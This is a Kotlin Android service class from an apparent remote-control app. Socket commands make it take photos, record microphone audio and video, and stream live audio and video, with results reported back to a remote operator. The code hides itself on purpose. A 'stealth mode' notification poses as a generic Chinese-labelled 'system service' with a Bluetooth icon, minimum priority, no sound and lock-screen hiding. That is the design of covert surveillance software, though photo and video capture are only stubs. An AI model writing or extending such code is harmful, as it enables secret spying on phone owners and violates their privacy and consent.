package com.remotecontrol.client.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.remotecontrol.client.R
import com.remotecontrol.client.RemoteControlApplication
import com.remotecontrol.client.utils.PermissionUtils
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class RemoteControlService : Service() {
    
    private var mediaRecorder: MediaRecorder? = null
    private var cameraDevice: CameraDevice? = null
    private var cameraManager: CameraManager? = null
    private var isRecording = false
    private var currentTaskId: String? = null
    
    companion object {
        private const val TAG = "RemoteControlService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "remote_control_channel"
        
        // 静态方法供Socket服务调用
        private var serviceInstance: RemoteControlService? = null
        
        fun takePhoto(taskId: String, camera: String, quality: String) {
            serviceInstance?.performTakePhoto(taskId, camera, quality)
        }
        
        fun recordAudio(taskId: String, duration: Int, quality: String) {
            serviceInstance?.performRecordAudio(taskId, duration, quality)
        }
        
        fun recordVideo(taskId: String, duration: Int, camera: String, quality: String) {
            serviceInstance?.performRecordVideo(taskId, duration, camera, quality)
        }
        
        fun startLiveAudio(taskId: String) {
            serviceInstance?.performStartLiveAudio(taskId)
        }
        
        fun stopLiveAudio() {
            serviceInstance?.performStopLiveAudio()
        }
        
        fun startLiveVideo(taskId: String) {
            serviceInstance?.performStartLiveVideo(taskId)
        }
        
        fun stopLiveVideo() {
            serviceInstance?.performStopLiveVideo()
        }
        
        fun switchCamera(camera: String) {
            serviceInstance?.performSwitchCamera(camera)
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        serviceInstance = this
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        createNotificationChannel()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createStealthNotification())
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceInstance = null
        releaseResources()
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.service_name), // "Android系统服务"
                NotificationManager.IMPORTANCE_MIN // 最低重要性，几乎不可见
            ).apply {
                description = "系统后台服务"
                enableLights(false) // 关闭指示灯
                enableVibration(false) // 关闭震动
                setShowBadge(false) // 不显示应用角标
                setSound(null, null) // 静音
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.service_name)) // "Android系统服务"
            .setContentText("系统服务正在运行")
            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth) // 使用系统蓝牙图标
            .setOngoing(true)
            .setSilent(true) // 完全静音
            .setPriority(NotificationCompat.PRIORITY_MIN) // 最低优先级
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // 在锁屏时隐藏
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // 标记为系统服务
            .build()
    }
    
    private fun createStealthNotification(): Notification {
        // 检查是否启用隐蔽模式
        val isStealthMode = PreferenceManager.isStealthMode(this)
        
        return if (isStealthMode) {
            // 隐蔽模式：使用系统服务外观
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("系统服务")
                .setContentText("")
                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                .setOngoing(true)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()
        } else {
            // 普通模式：显示真实信息
            createNotification()
        }
    }
    
    private fun performTakePhoto(taskId: String, camera: String, quality: String) {
        Log.d(TAG, "Taking photo - TaskID: $taskId, Camera: $camera, Quality: $quality")
        
        if (!PermissionUtils.hasCameraPermission(this)) {
            Log.e(TAG, "Camera permission not granted")
            sendTaskResult(taskId, false, "Camera permission not granted")
            return
        }
        
        try {
            currentTaskId = taskId
            // 实现拍照逻辑
            // 这里需要使用Camera2 API或CameraX来实现拍照功能
            // 由于代码较长，这里提供基本框架
            
            val outputFile = createOutputFile("photo", ".jpg")
            // 拍照完成后调用
            sendTaskResult(taskId, true, "Photo taken successfully", outputFile.absolutePath)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error taking photo", e)
            sendTaskResult(taskId, false, e.message ?: "Unknown error")
        }
    }
    
    private fun performRecordAudio(taskId: String, duration: Int, quality: String) {
        Log.d(TAG, "Recording audio - TaskID: $taskId, Duration: $duration, Quality: $quality")
        
        if (!PermissionUtils.hasAudioPermission(this)) {
            Log.e(TAG, "Audio permission not granted")
            sendTaskResult(taskId, false, "Audio permission not granted")
            return
        }
        
        try {
            currentTaskId = taskId
            val outputFile = createOutputFile("audio", ".mp3")
            
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }
            
            isRecording = true
            
            // 设置定时器停止录音
            Timer().schedule(object : TimerTask() {
                override fun run() {
                    stopRecording(taskId, outputFile.absolutePath)
                }
            }, duration * 1000L)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error recording audio", e)
            sendTaskResult(taskId, false, e.message ?: "Unknown error")
        }
    }
    
    private fun performRecordVideo(taskId: String, duration: Int, camera: String, quality: String) {
        Log.d(TAG, "Recording video - TaskID: $taskId, Duration: $duration, Camera: $camera, Quality: $quality")
        
        if (!PermissionUtils.hasCameraPermission(this) || !PermissionUtils.hasAudioPermission(this)) {
            Log.e(TAG, "Camera or audio permission not granted")
            sendTaskResult(taskId, false, "Camera or audio permission not granted")
            return
        }
        
        try {
            currentTaskId = taskId
            val outputFile = createOutputFile("video", ".mp4")
            
            // 实现录像逻辑
            // 这里需要使用Camera2 API配合MediaRecorder来实现录像功能
            
            // 录像完成后调用
            sendTaskResult(taskId, true, "Video recorded successfully", outputFile.absolutePath)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error recording video", e)
            sendTaskResult(taskId, false, e.message ?: "Unknown error")
        }
    }
    
    private fun performStartLiveAudio(taskId: String) {
        Log.d(TAG, "Starting live audio - TaskID: $taskId")
        
        if (!PermissionUtils.hasAudioPermission(this)) {
            Log.e(TAG, "Audio permission not granted")
            sendTaskResult(taskId, false, "Audio permission not granted")
            return
        }
        
        try {
            currentTaskId = taskId
            // WebRTC音频流处理已在SocketService中实现
            sendTaskResult(taskId, true, "Live audio started")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error starting live audio", e)
            sendTaskResult(taskId, false, e.message ?: "Unknown error")
        }
    }
    
    private fun performStopLiveAudio() {
        Log.d(TAG, "Stopping live audio")
        
        try {
            // WebRTC音频流停止已在SocketService中实现
            currentTaskId?.let { taskId ->
                sendTaskResult(taskId, true, "Live audio stopped")
            }
            currentTaskId = null
            
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping live audio", e)
        }
    }
    
    private fun performStartLiveVideo(taskId: String) {
        Log.d(TAG, "Starting live video - TaskID: $taskId")
        
        if (!PermissionUtils.hasCameraPermission(this)) {
            Log.e(TAG, "Camera permission not granted")
            sendTaskResult(taskId, false, "Camera permission not granted")
            return
        }
        
        try {
            currentTaskId = taskId
            // WebRTC视频流处理已在SocketService中实现
            sendTaskResult(taskId, true, "Live video started")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error starting live video", e)
            sendTaskResult(taskId, false, e.message ?: "Unknown error")
        }
    }
    
    private fun performStopLiveVideo() {
        Log.d(TAG, "Stopping live video")
        
        try {
            // WebRTC视频流停止已在SocketService中实现
            currentTaskId?.let { taskId ->
                sendTaskResult(taskId, true, "Live video stopped")
            }
            currentTaskId = null
            
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping live video", e)
        }
    }
    
    private fun performSwitchCamera(camera: String) {
        Log.d(TAG, "Switching camera to: $camera")
        
        try {
            // WebRTC摄像头切换已在SocketService中实现
            
        } catch (e: Exception) {
            Log.e(TAG, "Error switching camera", e)
        }
    }
    
    private fun stopRecording(taskId: String, filePath: String) {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            isRecording = false
            
            sendTaskResult(taskId, true, "Audio recorded successfully", filePath)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording", e)
            sendTaskResult(taskId, false, e.message ?: "Unknown error")
        }
    }
    
    private fun createOutputFile(type: String, extension: String): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "${type}_${timestamp}${extension}"
        val outputDir = File(getExternalFilesDir(null), type)
        if (!outputDir.exists()) {
            outputDir.mkdirs()
        }
        return File(outputDir, fileName)
    }
    
    private fun sendTaskResult(taskId: String, success: Boolean, message: String, filePath: String? = null) {
        try {
            val socketService = RemoteControlApplication.instance.socketService
            val result = org.json.JSONObject().apply {
                put("task_id", taskId)
                put("success", success)
                put("message", message)
                filePath?.let { put("file_path", it) }
                put("timestamp", System.currentTimeMillis())
            }
            
            socketService.emit("task_result", result)
            Log.d(TAG, "Task result sent: $result")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error sending task result", e)
        }
    }
    
    private fun releaseResources() {
        try {
            mediaRecorder?.release()
            mediaRecorder = null
            
            cameraDevice?.close()
            cameraDevice = null
            
            isRecording = false
            currentTaskId = null
            
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing resources", e)
        }
    }
}